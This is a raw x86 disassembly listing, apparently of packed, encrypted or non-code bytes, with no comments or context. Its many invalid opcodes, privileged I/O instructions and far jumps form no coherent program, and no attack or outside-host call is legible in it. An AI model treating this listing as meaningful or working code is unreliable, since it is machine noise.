  419079:	lock xor BYTE PTR [ebp+0x1fe6a005],ah
  419080:	jmp    0x4190d3
  419082:	loop   0x4190f9
  419084:	and    DWORD PTR [esi],esi
  419086:	aam    0x94
  419088:	div    DWORD PTR [ecx+0x5e]
  41908b:	lods   al,BYTE PTR ds:[esi]
  41908c:	and    al,0xdb
  41908e:	xchg   esi,eax
  41908f:	test   DWORD PTR [eax],0xb940837f
  419095:	stos   BYTE PTR es:[edi],al
  419096:	mov    esi,DWORD PTR ds:0x195f155e
  41909c:	iret   
  41909d:	mov    edx,0x7caeea80
  4190a2:	adc    ch,BYTE PTR [eax]
  4190a4:	stos   BYTE PTR es:[edi],al
  4190a5:	sub    esp,DWORD PTR [ebp-0xb]
  4190a8:	and    al,0xb9
  4190aa:	lock call 0x5459:0x4176e2ef
  4190b2:	inc    eax
  4190b3:	outs   dx,BYTE PTR ds:[esi]
  4190b4:	and    al,0x0
  4190b6:	shr    BYTE PTR [ebp+0x17],1
  4190b9:	out    dx,eax
  4190ba:	test   ah,dl
  4190bc:	jnp    0x419120
  4190be:	clc    
  4190bf:	daa    
  4190c0:	pop    es
  4190c1:	jg     0x4190aa
  4190c3:	sbb    BYTE PTR [eax+0x6b74cfdb],ah
  4190c9:	xchg   ebx,eax
  4190ca:	pop    ebp
  4190cb:	jg     0x419056
  4190cd:	les    ecx,FWORD PTR fs:[eax+0x72]
  4190d1:	dec    ebp
  4190d2:	pop    esi
  4190d3:	call   0x2ffb:0x9afcf2bc
  4190da:	stc    
  4190db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190dc:	xor    DWORD PTR [edx+eax*1],0x2a
  4190e0:	jbe    0x41914c
  4190e2:	bound  ebp,QWORD PTR [edx]
  4190e4:	(bad)  
  4190e5:	xor    al,0x1
  4190e7:	pop    esi
  4190e8:	pop    ds
  4190e9:	push   ebx
  4190ea:	and    BYTE PTR [edx],dh
  4190ec:	push   ebx
  4190ed:	add    dh,BYTE PTR [ebp+0x84c5e5d]
  4190f3:	mov    ch,0x52
  4190f5:	stos   BYTE PTR es:[edi],al
  4190f6:	lea    edx,[edi-0x46]
  4190f9:	cmp    ecx,0x9ac48083
  4190ff:	aas    
  419100:	adc    al,bh
  419102:	(bad)  [ecx+edx*2-0x40]
  419106:	sub    al,0xa0
  419108:	xchg   esi,eax
  419109:	mov    gs,ebx
  41910b:	inc    edi
  41910c:	pop    esi
  41910d:	sar    BYTE PTR [ecx-0x21],0x83
  419111:	in     eax,0xd4
  419113:	sub    ah,dl
  419115:	xchg   edx,edi
  419117:	pop    esp
  419118:	aaa    
  419119:	pop    edx
  41911a:	enter  0xedac,0xac
  41911e:	mov    edx,0x725c64cc
  419123:	enter  0x3053,0xe0
  419127:	(bad)  
  419128:	jg     0x4190e1
  41912a:	hlt    
  41912b:	arpl   cx,di
  41912d:	mov    WORD PTR [ebp-0x6d15b992],cs
  419133:	xlat   BYTE PTR ds:[ebx]
  419134:	xchg   ebp,eax
  419135:	and    DWORD PTR [edi-0x52146c15],ebx
  41913b:	(bad)  
  41913c:	sub    ecx,eax
  41913e:	add    BYTE PTR ds:0x29a39859,cl
  419144:	mov    bl,0x53
  419146:	push   0xffffffb2
  419148:	mov    bl,0x61
  41914a:	and    BYTE PTR [edi+0x6e736990],0x4b
  419151:	dec    eax
  419152:	hlt    
  419153:	sbb    BYTE PTR [esi+0x72953dbc],dl
  419159:	mov    al,ds:0x7a897c6c
  41915e:	inc    ebx
  41915f:	adc    DWORD PTR [ecx+0xa],edi
  419162:	xor    esi,DWORD PTR [edi-0x68]
  419165:	mov    ebx,0x255517ac
  41916a:	lds    esi,FWORD PTR [edx]
  41916c:	lea    esp,[eax+0xde328a2]
  419172:	jg     0x4191e4
  419174:	rcl    DWORD PTR [eax+0x6],1
  419177:	dec    esp
  419178:	sub    BYTE PTR [ebx+0x49f0b14],dl
  41917e:	daa    
  41917f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419180:	and    BYTE PTR [eax],bl
  419182:	ja     0x419194
  419184:	fist   DWORD PTR [edi-0x5c56d5d5]
  41918a:	cmp    ch,bh
  41918c:	push   edi
  41918d:	jecxz  0x41918c
  41918f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419190:	adc    BYTE PTR [ebx+0x1e],0xcf
  419194:	repz add eax,0x245122f7
  41919a:	sti    
  41919b:	mov    BYTE PTR [eax+eax*2+0x36],al
  41919f:	popa   
  4191a0:	sub    al,0x9
  4191a2:	dec    esi
  4191a3:	ret    0xd6e6
  4191a6:	add    bh,dh
  4191a8:	dec    edx
  4191a9:	dec    ebx
  4191aa:	leave  
  4191ab:	ins    BYTE PTR es:[edi],dx
  4191ac:	mov    al,0x1e
  4191ae:	xchg   esi,eax
  4191af:	clc    
  4191b0:	leave  
  4191b1:	push   0x41ce8cd4
  4191b6:	sbb    DWORD PTR [ecx-0x3],ebx
  4191b9:	xchg   DWORD PTR [ecx],ebx
  4191bb:	jne    0x41915a
  4191bd:	sbb    eax,0x72388a4e
  4191c2:	sub    esi,edx
  4191c4:	inc    edi
  4191c5:	leave  
  4191c6:	pop    ebx
  4191c7:	adc    bl,ch
  4191c9:	mov    ds:0xc83f701e,al
  4191ce:	push   es
  4191cf:	sub    eax,0x2e924f33
  4191d4:	sbb    ch,bh
  4191d6:	das    
  4191d7:	xor    al,0xe0
  4191d9:	pmulhuw mm3,QWORD PTR ds:0xdcba73f
  4191e0:	add    edi,ecx
  4191e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191e3:	(bad)  
  4191e4:	jbe    0x419206
  4191e6:	outs   dx,DWORD PTR ds:[esi]
  4191e7:	ja     0x41921c
  4191e9:	cmp    eax,0xad4fc567
  4191ee:	addr16 dec esi
  4191f0:	out    0xd7,eax
  4191f2:	add    DWORD PTR [eax],eax
  4191f4:	(bad)  
  4191f5:	ficom  WORD PTR [edx-0x5f6f079f]
  4191fb:	dec    ebx
  4191fc:	ja     0x4191b0
  4191fe:	mov    cl,BYTE PTR [ebp+0x716f024a]
  419204:	adc    ebp,ebp
  419206:	add    eax,0xb31f7da4
  41920b:	test   ebx,ebp
  41920d:	bound  ecx,QWORD PTR [esi+0x2bf811e2]
  419213:	push   0x1d30cf76
  419218:	dec    esi
  419219:	sbb    eax,0x47b613f8
  41921e:	jg     0x41923d
  419220:	jl     0x41927d
  419222:	imul   edx,DWORD PTR [esi-0x645b1427],0xffffffd6
  419229:	cmc    
  41922a:	and    dh,BYTE PTR [esi]
  41922c:	mov    al,0xf7
  41922e:	or     dh,BYTE PTR [ebx-0x663783dd]
  419234:	enter  0x7670,0x1e
  419238:	and    al,0x8b
  41923a:	xor    DWORD PTR [eax],esi
  41923c:	mov    es,WORD PTR [eax]
  41923e:	pop    ds
  41923f:	inc    edx
  419240:	lods   al,BYTE PTR ds:[esi]
  419241:	(bad)  
  419242:	lahf   
  419243:	sbb    al,0x4d
  419245:	fsubr  st(3),st
  419247:	xor    dl,BYTE PTR [ebp-0x71c7340d]
  41924d:	retf   
  41924e:	lock push edi
  419250:	xchg   edi,eax
  419251:	sub    DWORD PTR [edx+eax*1+0x39bc607f],ebp
  419258:	test   DWORD PTR ds:0x27db97a0,edx
  41925e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41925f:	sbb    eax,0x423e3af4
  419264:	xor    bh,BYTE PTR [edi+0x45]
  419267:	inc    ebx
  419268:	jl     0x4191f6
  41926a:	mov    ah,0x98
  41926c:	push   edi
  41926d:	ficom  DWORD PTR [eax]
  41926f:	push   ss
  419270:	cld    
  419271:	sub    eax,0xb9c28e85
  419276:	loop   0x41922c
  419278:	sbb    dl,dl
  41927a:	stos   DWORD PTR es:[edi],eax
  41927b:	dec    edi
  41927c:	mov    dl,0x73
  41927e:	jns    0x419237
  419280:	mov    BYTE PTR [esi+ebp*1-0x71],0xd3
  419285:	mov    al,ds:0x1263bda3
  41928a:	call   0x1540:0xc910f4ed
  419291:	enter  0x1429,0xf9
  419295:	xor    al,0x6a
  419297:	or     al,0x11
  419299:	popa   
  41929a:	mov    bh,0xf
  41929c:	loopne 0x419264
  41929e:	or     DWORD PTR [esi+0x3c974fee],ecx
  4192a4:	jl     0x419251
  4192a6:	fisub  WORD PTR [edi-0x37d2ced1]
  4192ac:	fldcw  WORD PTR [eax-0x69]
  4192af:	out    dx,al
  4192b0:	(bad)  
  4192b1:	into   
  4192b2:	je     0x41931b
  4192b4:	mov    BYTE PTR [eax+edi*2-0x5a],ch
  4192b8:	aaa    
  4192b9:	mov    ds:0x256775c8,al
  4192be:	lods   al,BYTE PTR ds:[esi]
  4192bf:	inc    esi
  4192c0:	retf   
  4192c1:	sti    
  4192c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c3:	adc    edx,0xc579df75
  4192c9:	jmp    0x41932a
  4192cb:	pop    esi
  4192cc:	jmp    0x4192ae
  4192ce:	inc    ecx
  4192cf:	iret   
  4192d0:	mov    ah,0x58
  4192d2:	lahf   
  4192d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d4:	daa    
  4192d5:	pusha  
  4192d6:	jo     0x419299
  4192d8:	mov    ds:0xeae0dcaa,eax
  4192dd:	mov    esp,0x385fc48e
  4192e2:	in     eax,dx
  4192e3:	xlat   BYTE PTR ds:[ebx]
  4192e4:	and    dl,BYTE PTR [edi-0x6]
  4192e7:	or     edx,DWORD PTR ds:0xc341f848
  4192ed:	and    BYTE PTR [edi-0x7f86cb8c],dh
  4192f3:	xor    al,0x63
  4192f5:	gs rcl esp,1
  4192f8:	jne    0x41934b
  4192fa:	aaa    
  4192fb:	repz popa 
  4192fd:	push   ecx
  4192fe:	jp     0x419283
  419300:	mov    al,0x8d
  419302:	div    eax
  419304:	cwde   
  419305:	ds fcomi st,st(2)
  419308:	and    eax,0xde10447e
  41930d:	fcomi  st,st(1)
  41930f:	pop    edx
  419310:	adc    eax,0x19fbde23
  419315:	push   ebx
  419316:	mov    ecx,0x57c08c99
  41931b:	lock jle 0x41934e
  41931e:	pop    ecx
  41931f:	lods   eax,DWORD PTR ds:[esi]
  419320:	or     DWORD PTR [ebx],esi
  419322:	(bad)  
  419323:	mov    cl,0x27
  419325:	push   0x6be2c45e
  41932a:	mov    eax,ss
  41932c:	mov    cl,0xaf
  41932e:	jle    0x41938c
  419330:	mov    DWORD PTR [edx+0x27],0x952ee867
  419337:	add    dh,BYTE PTR [edx-0x5b]
  41933a:	enter  0x1ba,0xdb
  41933e:	loopne 0x4192df
  419340:	test   ebx,ebx
  419342:	mov    ds:0x1adfb50d,al
  419347:	jmp    0xdef5:0x4c980d22
  41934e:	sti    
  41934f:	mov    dl,0x31
  419351:	and    DWORD PTR [edx-0x886042c],edi
  419357:	mov    ecx,DWORD PTR [eax+0x30]
  41935a:	mov    cl,0x6e
  41935c:	sti    
  41935d:	into   
  41935e:	fadd   QWORD PTR [eax+edi*2-0x2b56ae25]
  419365:	int3   
  419366:	test   al,0x7
  419368:	sub    BYTE PTR ss:[esi],al
  41936b:	or     BYTE PTR [ecx-0x2ff5ca50],al
  419371:	inc    ebx
  419372:	inc    edx
  419373:	lods   al,BYTE PTR ds:[esi]
  419374:	ins    DWORD PTR es:[edi],dx
  419375:	sbb    eax,0x12c0e668
  41937a:	dec    edx
  41937b:	test   DWORD PTR [eax+0x7ae443bd],ecx
  419381:	retf   
  419382:	mov    DWORD PTR es:[edi-0x45],ebx
  419386:	xchg   ebp,eax
  419387:	jmp    0x268f:0x9dbdd944
  41938e:	daa    
  41938f:	loope  0x419330
  419391:	loop   0x4193df
  419393:	xor    edx,0x74
  419396:	sbb    BYTE PTR ds:0x819ba1be,bl
  41939c:	fisubr WORD PTR [ecx+0x11]
  41939f:	mov    al,ds:0x1150a1c8
  4193a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a5:	pop    ecx
  4193a6:	data16 fist DWORD PTR [ebx-0x18f1ed5d]
  4193ad:	ins    BYTE PTR es:[edi],dx
  4193ae:	scas   eax,DWORD PTR es:[edi]
  4193af:	gs (bad) 
  4193b1:	push   ds
  4193b2:	daa    
  4193b3:	dec    eax
  4193b5:	popa   
  4193b6:	sub    DWORD PTR [edi+0x532531e0],ecx
  4193bc:	clc    
  4193bd:	xchg   ecx,eax
  4193be:	xor    BYTE PTR [esi+0x50],dl
  4193c1:	popf   
  4193c2:	(bad)  
  4193c4:	mov    DWORD PTR [ebp+0x4fbdb17],eax
  4193ca:	ja     0x419392
  4193cc:	push   ebx
  4193cd:	and    DWORD PTR [edi+0x4ccda9ef],ebp
  4193d3:	imul   edi,DWORD PTR [eax-0x58],0xd3ffdc1d
  4193da:	adc    bl,bh
  4193dc:	sub    DWORD PTR [edx+0x536d7ac5],0xffffff9b
  4193e3:	mov    ch,0xd3
  4193e5:	jo     0x4193eb
  4193e7:	push   cs
  4193e8:	pop    edx
  4193e9:	dec    esi
  4193ea:	sub    ebx,ecx
  4193ec:	add    bh,BYTE PTR [esi]
  4193ee:	sahf   
  4193ef:	push   0x50
  4193f1:	pop    ebp
  4193f2:	loopne 0x419411
  4193f4:	mov    edx,0xde2071bb
  4193f9:	pop    esi
  4193fa:	cmc    
  4193fb:	jge    0x41942f
  4193fd:	test   eax,0xf39ebc49
  419402:	rcl    bh,1
  419404:	clc    
  419405:	or     eax,0xaf0ee5b6
  41940a:	lea    esp,[ecx-0x7dac2ee5]
  419410:	jecxz  0x4193b3
  419412:	sbb    bl,BYTE PTR [ebx-0x5]
  419415:	or     al,0x94
  419417:	push   eax
  419418:	jb     0x419438
  41941a:	mov    al,ds:0x82dc39e7
  41941f:	mov    al,0x79
  419421:	sbb    dh,BYTE PTR [edx+0x1db02b4a]
  419427:	out    dx,al
  419428:	inc    ecx
  419429:	stos   DWORD PTR es:[edi],eax
  41942a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41942b:	(bad)  
  41942c:	or     al,0x52
  41942e:	add    ebx,DWORD PTR [ecx-0x27]
  419431:	push   ebx
  419432:	enter  0xa8e6,0x67
  419436:	mov    al,0xba
  419438:	adc    eax,0xdf82273a
  41943d:	cs nop
  41943f:	jb     0x4194b0
  419441:	retf   
  419442:	repz sub DWORD PTR [esp+eax*8],edi
  419446:	in     al,dx
  419447:	mov    esp,0x796397a1
  41944c:	push   0xffffffa9
  41944e:	aaa    
  41944f:	test   DWORD PTR [ebx],eax
  419451:	mov    ds:0x5180e8a3,al
  419456:	enter  0x2be7,0xd0
  41945a:	out    0x9b,eax
  41945c:	mov    ds:0x6d861649,eax
  419461:	call   0x92d8fda1
  419466:	xor    cl,BYTE PTR [esi+0x3d674b1d]
  41946c:	inc    edi
  41946d:	cmp    DWORD PTR [ecx+esi*4+0x7a573edb],edi
  419474:	es sbb ebp,ebp
  419477:	stc    
  419478:	loop   0x4194e6
  41947a:	xchg   ebx,eax
  41947b:	data16 or al,dl
  41947e:	shl    BYTE PTR [ebx+0x70],cl
  419481:	call   0x56c5:0x4caab835
  419488:	push   0xcc9877e2
  41948d:	inc    eax
  41948e:	ins    DWORD PTR es:[edi],dx
  41948f:	fwait
  419490:	int3   
  419491:	push   edx
  419492:	cmp    bh,ch
  419494:	mov    ah,0x7e
  419496:	in     al,dx
  419497:	dec    esi
  419498:	int    0x4d
  41949a:	std    
  41949b:	das    
  41949c:	int3   
  41949d:	cmp    esi,ecx
  41949f:	add    BYTE PTR [eax],al
  4194a1:	(bad)  
  4194a3:	ja     0x4194dd
  4194a5:	dec    esi
  4194a6:	push   ss
  4194a7:	mov    edi,0x470b7f4a
  4194ac:	mov    bl,0x32
  4194ae:	popf   
  4194af:	out    dx,al
  4194b0:	or     al,0x71
  4194b2:	mov    ebx,0x377ca25f
  4194b7:	mov    BYTE PTR [ecx+ebx*2],ah
  4194ba:	jns    0x419443
  4194bc:	inc    esi
  4194bd:	js     0x419537
  4194bf:	add    BYTE PTR [ecx-0x1b],ah
  4194c2:	mov    al,0x91
  4194c4:	mov    ah,0x23
  4194c6:	test   DWORD PTR [edi-0x41ff3bfd],ebx
  4194cc:	sub    BYTE PTR [edx+0x2f704172],cl
  4194d2:	adc    eax,0xe6e6fda9
  4194d7:	xchg   esi,eax
  4194d8:	or     bl,BYTE PTR [edi+ebx*8]
  4194db:	adc    cl,BYTE PTR [ebx+edx*8]
  4194de:	je     0x41947c
  4194e0:	pop    ecx
  4194e1:	imul   edx,DWORD PTR [edi],0x578c731c
  4194e7:	aad    0xed
  4194e9:	mov    eax,ds:0x59ae128d
  4194ee:	rcl    BYTE PTR [eax],cl
  4194f0:	js     0x419541
  4194f2:	mov    WORD PTR [ecx-0x6263cadd],fs
  4194f8:	shl    esi,0x60
  4194fb:	inc    ebx
  4194fc:	outs   dx,BYTE PTR ds:[esi]
  4194fd:	push   ecx
  4194fe:	dec    ebp
  4194ff:	xor    eax,DWORD PTR [ecx]
  419501:	dec    ebx
  419502:	call   0x90e7:0x78834c16
  419509:	jl     0x4194eb
  41950b:	add    DWORD PTR ds:0xdac3be70,edx
  419511:	call   0x9ab29875
  419516:	ins    BYTE PTR es:[edi],dx
  419517:	out    0x3b,al
  419519:	int    0x26
  41951b:	call   0xbb77:0xf4d67c55
  419522:	loope  0x419570
  419524:	cld    
  419525:	popf   
  419526:	dec    esi
  419527:	fcmove st,st(2)
  419529:	adc    BYTE PTR [di],bl
  41952c:	and    al,BYTE PTR [eax+ebp*1-0x17]
  419530:	dec    esp
  419531:	imul   esi,ebx,0xe
  419534:	push   0xffffffc7
  419536:	cmp    eax,0xfbce8f79
  41953b:	retf   0x49b9
  41953e:	outs   dx,DWORD PTR ds:[esi]
  41953f:	xlat   BYTE PTR ds:[ebx]
  419540:	loop   0x419575
  419542:	add    dl,dl
  419544:	hlt    
  419545:	or     eax,0x1c2e1e7e
  41954a:	jb     0x419505
  41954c:	xchg   edx,eax
  41954d:	or     eax,0xf7aab82f
  419552:	jmp    0x1feeb10c
  419557:	test   BYTE PTR [ecx-0x80],cl
  41955a:	into   
  41955b:	and    bl,BYTE PTR [ecx]
  41955d:	push   edi
  41955e:	add    esi,edi
  419560:	aaa    
  419561:	test   DWORD PTR [ebx+0x71],edx
  419564:	xchg   edx,eax
  419565:	push   ds
  419566:	outs   dx,BYTE PTR ds:[esi]
  419567:	mov    dl,0xde
  419569:	fimul  WORD PTR [edi+ebp*1-0x7b]
  41956d:	mov    esi,0x742b7d10
  419572:	test   al,0x8c
  419574:	lea    edi,[esi]
  419576:	cmc    
  419577:	shr    ch,1
  419579:	dec    ebx
  41957a:	mov    al,BYTE PTR [ebp-0x42576dce]
  419580:	stos   DWORD PTR es:[edi],eax
  419581:	xchg   esp,eax
  419582:	je     0x419521
  419584:	pop    es
  419585:	sub    al,BYTE PTR [edx]
  419587:	xchg   ecx,eax
  419588:	inc    edi
  419589:	sub    al,dl
  41958b:	mov    esp,DWORD PTR [ecx]
  41958d:	das    
  41958e:	sub    cl,dh
  419590:	test   BYTE PTR [ebx+0x7fb996d6],ah
  419596:	in     eax,dx
  419597:	sub    BYTE PTR [ebx],0xcb
  41959a:	pop    edx
  41959b:	test   BYTE PTR [ecx-0x3b9d5d75],ah
  4195a1:	cwde   
  4195a2:	or     esi,DWORD PTR [ecx+0x3a]
  4195a5:	mov    ah,BYTE PTR [eax-0x56ca0bc7]
  4195ab:	fcom   DWORD PTR [esi+0x398b0d6c]
  4195b1:	test   al,0xa4
  4195b3:	sub    BYTE PTR [esi-0x78],ch
  4195b6:	dec    eax
  4195b7:	fadd   QWORD PTR [ecx+0x29708b43]
  4195bd:	push   cs
  4195be:	add    bl,BYTE PTR [ebx+ebx*1]
  4195c1:	in     eax,dx
  4195c2:	push   ebx
  4195c3:	fsub   DWORD PTR [ecx-0x620ddad3]
  4195c9:	inc    ebx
  4195ca:	int3   
  4195cb:	les    ecx,FWORD PTR [eax]
  4195cd:	mov    ebx,0x3a4a6c27
  4195d2:	inc    ebp
  4195d3:	pop    edx
  4195d4:	fwait
  4195d5:	into   
  4195d6:	ds mov eax,0xa7385ae1
  4195dc:	data16 in al,0x88
  4195df:	mov    eax,0x1d32580c
  4195e4:	jo     0x4195a8
  4195e6:	rcl    BYTE PTR [edi+0x69],0x18
  4195ea:	std    
  4195eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ec:	or     bh,0x98
  4195ef:	retf   0x5281
  4195f2:	sub    ah,dl
  4195f4:	pop    esi
  4195f5:	pop    esp
  4195f6:	aam    0xfc
  4195f8:	mov    edi,0xa0d22574
  4195fd:	xor    eax,0x5f19edeb
  419602:	aad    0x68
  419604:	or     eax,0xbcdf3724
  419609:	mov    edi,0x12e828d7
  41960e:	gs stos DWORD PTR es:[edi],eax
  419610:	xchg   ecx,eax
  419611:	adc    eax,DWORD PTR [ebx-0x56e0affa]
  419617:	xor    BYTE PTR [esp+edx*4],bh
  41961a:	out    0xb,al
  41961c:	(bad)  
  41961e:	pop    edx
  41961f:	icebp  
  419620:	add    DWORD PTR [eax-0xaec6cf],ecx
  419626:	push   ebx
  419627:	loop   0x41965d
  419629:	stos   BYTE PTR es:[edi],al
  41962a:	inc    ebp
  41962b:	ret    0x8917
  41962e:	push   ss
  41962f:	fild   WORD PTR [eax-0x75]
  419632:	inc    ebp
  419633:	shl    DWORD PTR [edi-0x143f12d5],cl
  419639:	jo     0x4195fc
  41963b:	mov    bh,0x27
  41963d:	fs xchg edx,eax
  41963f:	test   eax,0x361dbc0f
  419644:	inc    ebp
  419645:	mov    al,0x6b
  419647:	push   ecx
  419648:	je     0x419619
  41964a:	jp     0x41961f
  41964c:	fisttp QWORD PTR [esi]
  41964e:	mov    ecx,0xe735babd
  419653:	repz jge 0x4195fa
  419656:	mov    esi,ebx
  419658:	cwde   
  419659:	push   eax
  41965a:	btr    eax,eax
  41965d:	pop    ds
  41965e:	mov    bl,0x9c
  419660:	fisub  DWORD PTR [edi+0x2248b53]
  419666:	repnz sub al,0xc5
  419669:	fnstsw WORD PTR [edx-0x67]
  41966c:	arpl   cx,si
  41966e:	mov    DWORD PTR [edi+0x60dc0a20],esp
  419674:	mov    BYTE PTR [ebx-0x35d8f25e],bh
  41967a:	xor    ecx,DWORD PTR [eax+0x453325af]
  419680:	lds    eax,FWORD PTR ds:0x3462bd3d
  419686:	sar    DWORD PTR [ecx-0x14],cl
  419689:	test   al,dl
  41968b:	iret   
  41968c:	add    DWORD PTR [ebx-0x544554c9],edx
  419692:	jle    0x419616
  419694:	fiadd  DWORD PTR [ebx]
  419696:	mov    cl,0x2c
  419698:	or     al,0x6c
  41969a:	sub    eax,0x290462d8
  41969f:	mov    ecx,0x9b665484
  4196a4:	jl     0x419716
  4196a6:	cmc    
  4196a7:	data16 loope 0x41962a
  4196aa:	les    edx,FWORD PTR cs:[edi+0x448f9cbe]
  4196b1:	gs data16 loope 0x41971a
  4196b5:	idiv   BYTE PTR [ebx+edi*1-0x1f]
  4196b9:	es xchg ebp,eax
  4196bb:	int3   
  4196bc:	lock jle 0x419692
  4196bf:	mov    edi,0xb0dfad0e
  4196c4:	lds    ebx,FWORD PTR [ecx-0x42]
  4196c7:	cmp    eax,0xc88de8fb
  4196cc:	sbb    bh,BYTE PTR [edx+0x74340d63]
  4196d2:	movnti DWORD PTR [eax-0x2e],edi
  4196d6:	shr    ebp,cl
  4196d8:	mov    ds:0xef928f38,eax
  4196dd:	xchg   esp,eax
  4196de:	xchg   DWORD PTR [eax+ebp*1],ebp
  4196e1:	pop    esi
  4196e2:	int3   
  4196e3:	icebp  
  4196e4:	or     BYTE PTR [edx],dh
  4196e6:	(bad)  
  4196e7:	leave  
  4196e8:	mov    es,WORD PTR [eax+0x7d]
  4196eb:	stos   BYTE PTR es:[edi],al
  4196ec:	ss push ss
  4196ee:	neg    bl
  4196f0:	sub    ch,BYTE PTR [edx-0x5934b50b]
  4196f6:	mov    WORD PTR [edx+0x599a19a7],es
  4196fc:	inc    ecx
  4196fd:	sahf   
  4196fe:	cmp    al,0x6f
  419700:	mov    DWORD PTR [edi-0x396429a5],esp
  419706:	es (bad) 
  419709:	ret    
  41970a:	and    bl,BYTE PTR [edx-0x3fd48370]
  419710:	or     ebx,esi
  419712:	mov    esi,0x46d8a8a7
  419717:	cmp    ecx,ecx
  419719:	mov    bh,0x7d
  41971b:	test   BYTE PTR [ebp-0x26af07b0],dl
  419721:	xchg   ecx,eax
  419722:	out    dx,eax
  419723:	das    
  419724:	push   ecx
  419725:	les    ecx,FWORD PTR [ecx+0x191003c6]
  41972b:	pop    esp
  41972c:	popa   
  41972d:	std    
  41972e:	xor    ah,BYTE PTR [edi+0x50295efa]
  419734:	imul   esp,ebx,0xffffffa0
  419737:	shl    DWORD PTR [ebx+0x4bf3cdd6],1
  41973d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973f:	inc    ecx
  419740:	sahf   
  419741:	fsub   DWORD PTR [eax+eiz*2]
  419744:	mov    edx,0x3046d4f5
  419749:	pop    edx
  41974a:	fsubr  st(0),st
  41974c:	add    eax,0xbe0c9b86
  419751:	les    esp,FWORD PTR [edi]
  419753:	out    0x4,eax
  419755:	outs   dx,DWORD PTR ds:[esi]
  419756:	bound  ebx,QWORD PTR [esi+0x5e]
  419759:	fwait
  41975a:	push   edx
  41975b:	ds push cs
  41975d:	mov    cl,0x26
  41975f:	lods   eax,DWORD PTR ds:[esi]
  419760:	sahf   
  419761:	and    ecx,DWORD PTR [ebx+ebp*2]
  419764:	bound  ebx,QWORD PTR [edx+ebp*8+0x15c02ab0]
  41976b:	hlt    
  41976c:	add    BYTE PTR [ecx-0x2d709cd9],0xa2
  419773:	cs mov ebp,0xf3965965
  419779:	mov    al,ds:0x43627df0
  41977e:	lds    ecx,FWORD PTR [ebp+0x24f8b6c]
  419784:	popa   
  419785:	ins    BYTE PTR es:[edi],dx
  419786:	psllw  mm2,QWORD PTR [edi+0x4b]
  41978a:	sub    BYTE PTR [edx+0xf],al
  41978d:	ins    BYTE PTR es:[edi],dx
  41978e:	cmc    
  41978f:	int    0xa5
  419791:	or     al,0x47
  419793:	repz aam 0xcb
  419796:	iret   
  419797:	test   BYTE PTR [ebx+ecx*1-0x779e424e],bl
  41979e:	arpl   bp,ax
  4197a0:	sar    BYTE PTR [ebx],1
  4197a2:	call   0x68ba9825
  4197a7:	icebp  
  4197a8:	je     0x41977a
  4197aa:	pop    eax
  4197ab:	mov    ds:0xb37b96f7,al
  4197b0:	sub    al,0x60
  4197b2:	mov    ds:0xf04eede7,al
  4197b7:	mov    al,ds:0xf7a3472c
  4197bc:	mov    DWORD PTR [eax+0x79385b03],esi
  4197c2:	sti    
  4197c3:	test   eax,0x2dc94e54
  4197c8:	or     DWORD PTR [ecx-0x42597b43],ebx
  4197ce:	adc    al,0xfd
  4197d0:	lds    ebx,FWORD PTR [ebx]
  4197d2:	in     eax,0x50
  4197d4:	add    dl,bh
  4197d6:	and    DWORD PTR [esi],esi
  4197d8:	mov    bl,0x11
  4197da:	mov    edi,0x7d512064
  4197df:	cs loopne 0x4197dc
  4197e2:	or     edx,DWORD PTR [esi+0x6e]
  4197e5:	add    DWORD PTR [edi],ebp
  4197e7:	retf   0xa4dd
  4197ea:	push   0xdc844c3d
  4197ef:	adc    eax,DWORD PTR [esp+esi*4+0x4d]
  4197f3:	or     edi,DWORD PTR [edi+0x5b789cb3]
  4197f9:	hlt    
  4197fa:	std    
  4197fb:	adc    bl,BYTE PTR [edi-0x69]
  4197fe:	adc    ebp,DWORD PTR [edi]
  419800:	mov    cl,0x8c
  419802:	dec    ecx
  419803:	leave  
  419804:	mov    edx,0x5a3d79c0
  419809:	jo     0x4197ac
  41980b:	xor    eax,0x77220c54
  419810:	xchg   esp,eax
  419811:	mul    eax
  419813:	add    esi,DWORD PTR [eax+0x6b]
  419816:	xlat   BYTE PTR ds:[ebx]
  419817:	lahf   
  419818:	std    
  419819:	fmul   DWORD PTR [edx]
  41981b:	push   ss
  41981c:	adc    eax,DWORD PTR ds:0x76c4415c
  419822:	gs aas 
  419824:	shl    ebp,cl
  419826:	les    esp,FWORD PTR [ecx+0x14]
  419829:	adc    ebx,ebp
  41982b:	jmp    0x419852
  41982d:	or     eax,0x1b2a68ee
  419832:	mov    BYTE PTR [ecx+0x374ffc24],cl
  419838:	xchg   DWORD PTR [ebp-0x23c3cfb7],ebx
  41983e:	dec    ebx
  41983f:	adc    BYTE PTR [esi],ah
  419841:	ins    DWORD PTR es:[edi],dx
  419842:	jno    0x4197ff
  419844:	xchg   ch,cl
  419846:	push   ss
  419847:	ficom  WORD PTR [ecx-0x47026e69]
  41984d:	xchg   ecx,eax
  41984e:	push   esi
  41984f:	xor    al,0xa4
  419851:	vxorps xmm1,xmm4,xmm5
  419855:	mov    bh,0xc8
  419857:	scas   al,BYTE PTR es:[edi]
  419858:	fimul  WORD PTR [ebx-0x5f8c2888]
  41985e:	rcr    DWORD PTR [ebx],1
  419860:	sbb    bl,0x2f
  419863:	or     al,0x3b
  419865:	pop    edi
  419866:	iret   
  419867:	sbb    BYTE PTR [edi+0x23],bl
  41986a:	nop
  41986b:	lahf   
  41986c:	imul   ebx,DWORD PTR [ebx-0x7702fc9f],0x307891f6
  419876:	loopne 0x41987e
  419878:	mov    ds:0x3eee6391,eax
  41987d:	inc    ebx
  41987e:	adc    DWORD PTR [eax+eax*1-0x3baf8b3c],0x789fee1d
  419889:	shl    DWORD PTR [eax],1
  41988b:	mov    ah,0xe3
  41988d:	es fucom st(2)
  419890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419891:	mov    BYTE PTR [eax-0x6c],al
  419894:	adc    DWORD PTR [edx-0x6500a811],edi
